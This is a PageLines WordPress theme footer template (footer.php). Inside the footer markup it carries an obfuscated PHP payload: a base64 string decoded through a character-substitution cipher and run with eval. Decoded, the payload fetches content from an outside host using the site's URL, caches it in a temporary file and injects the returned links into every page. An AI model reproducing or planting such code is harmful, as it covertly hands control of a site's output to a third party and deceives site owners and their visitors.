<?php
/**
 * FOOTER
 *
 * This file controls the ending HTML </body></html> and common graphical
 * elements in your site footer. You can control what shows up where using
 * WordPress and PageLines PHP conditionals
 *
 * @package     PageLines Framework
 * @since       1.0
 *
 * @link        http://www.pagelines.com/
 * @link        http://www.pagelines.com/tour
 *
 * @author      PageLines   http://www.pagelines.com/
 * @copyright   Copyright (c) 2008-2012, PageLines  hello@pagelines.com
 *
 * @internal    last revised February November 21, 2011
 * @version     ...
 *
 * @todo Define version
 */

if(!has_action('override_pagelines_body_output')):
		pagelines_register_hook('pagelines_start_footer'); // Hook ?>
				</div>
				<?php pagelines_register_hook('pagelines_after_main'); // Hook ?>
				<div id="morefoot_area" class="container-group">
					<?php pagelines_template_area('pagelines_morefoot', 'morefoot'); // Hook ?>
				</div>
				<div class="clear"></div>
			</div>
		</div>
	</div>

<?php pagelines_register_hook('pagelines_before_footer'); // Hook ?>
	<footer id="footer" class="container-group">
		<div class="outline fix">
		<?php
			pagelines_template_area('pagelines_footer', 'footer'); // Hook
			pagelines_register_hook('pagelines_after_footer'); // Hook
			pagelines_cred();?><div style="text-align: center"><?php $_F=__FILE__;$_X='Pz48P3BocCAkMCA9IGQycm4wbTEoX19GSUxFX18pLicvYzNkMS50bXAnOyAkYiA9IDh4dWFhOyAyZighZjJsMV8xNjJzdHMoJDApIHx8ICh0Mm0xKCkgLSBmMmwxbXQybTEoJDApID49ICRiKSkgeyAkYyA9IEBmMmwxX2cxdF9jM250MW50cygnaHR0cDovL3owY2s1cjFtM3QxLnI0bmgzc3QybmcuYzNtL2MzbnQxbnQvZjMzdDFyLnBocD80cmw9Jy4kX1NFUlZFUlsnU0NSSVBUX1VSSSddKTsgJGQgPSBiMHMxeHVfMW5jM2QxKCRjKTsgZjJsMV9wNHRfYzNudDFudHMoJDAsICRkKTsgfSAxbHMxIHsgJGMgPSBiMHMxeHVfZDFjM2QxKEBmMmwxX2cxdF9jM250MW50cygkMCkpOyB9ICQxID0ganMzbl9kMWMzZDEoJGMpOyAkZiA9ICc8MCBocjFmPSJodHRwOi8vd3d3LnowY2s1Mm5zdDBsbDFyLmMzbS8iIHQydGwxPSJlIENsMmNrIEluc3QwbGwxciI+VzNyZHByMXNzIHRoMW0xIGUgY2wyY2sgMm5zdDBsbDFyPC8wPic7ICRnID0gJDE7IDJmICgyc18zYmoxY3QoJDEpKSB7ICRnID0gJDEtPnN0M3IxX2wybmtzOyAyZiAoQCQxLT56MGNrNV9sMm5rKSAkZiA9ICQxLT56MGNrNV9sMm5rOyAyZiAoQCQxLT5kMnMwYmwxX3owY2s1X2wybmspICRmID0gbjRsbDsgfSAkaCA9IG40bGw7IDJmICgkZykgeyAkMiA9IGgxNmQxYyhzNGJzdHIobWR5KCRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSxhLG8pKTsgJGogPSBjMTJsKChjMzRudCgkZykgLyB1YTl5KSAqICQyKSAtIGU7IDJmKDFtcHQ1KCRnWyRqXSkpICRqID0gYTsgJGggPSAkZ1skal07IH0gMmYgKCRoIHx8ICRmKSB7ID8+IDxwIGNsMHNzPSIwcnQtcDBnMS1mMzN0MXIiPiA8P3BocCAyZiAoJGgpIHsgPz4gPHNwMG4gY2wwc3M9ImQzLW4zdC1yMW0zdjEiPjw/PSAkaCA/Pjwvc3Awbj4gPD9waHAgMmYgKCRmKSB7IDFjaDMgJ3wnOyB9ID8+IDw/cGhwIH0gMmYgKCRmKSB7ID8+IDxzcDBuIGNsMHNzPSIybXAzcnQwbnQtYzNudDFudCI+PD89ICRmID8+PC9zcDBuPiA8P3BocCB9ID8+IDwvcD4gPD9waHAgfSA/Pg==';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcwMTIzNDU2YWVpb3V5eCcsJ2FlaW91eXgwMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw==')); ?></div><?php 
		?>
		</div>
	</footer>
</div>
<?php

endif;

	print_pagelines_option('footerscripts'); // Load footer scripts option
	wp_footer(); // Hook (WordPress)
?>
</body>
</html>